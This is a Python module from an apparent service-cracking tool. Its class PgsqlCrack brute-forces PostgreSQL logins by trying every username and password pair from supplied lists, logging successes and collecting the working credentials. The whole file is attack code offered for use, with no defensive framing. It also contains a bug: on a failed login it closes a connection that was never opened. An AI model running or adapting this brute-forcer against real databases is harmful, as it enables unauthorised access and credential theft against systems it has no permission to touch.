# coding: utf-8
import psycopg2

from servicecrack.service.Base import BaseCrack
from servicecrack.utils.logg import Logging

logging = Logging("pgsql")

service_name = "pgsql"


class PgsqlCrack(BaseCrack):
    def __init__(self, host, port, usernames, passwords):
        super(PgsqlCrack, self).__init__(host, port, usernames, passwords, service_name)
        if not port:
            self.port = 5432

    def run(self):
        logging.info("start crack {}:{}".format(self.host, self.port))
        for username in self.usernames:
            for password in self.passwords:
                self.crack(username, password)
        logging.info("brute {} ending".format(self.service_name))
        logging.info(self.result)

    def crack(self, username, password):
        logging.debug("start use {} {}".format(username, password))
        success = 0
        try:
            conn = psycopg2.connect(host=self.host, port=self.port, user=username, password=password)
            logging.info("brute success :{} {}".format(username, password))
            success = 1
        except Exception as e:
            logging.debug(e)
            logging.debug("brute faild:{} {}".format(username, password))
            conn.close()
        finally:
            if not success:
                return
            conn.close()
            self.result.append({"username": username, "password": password})



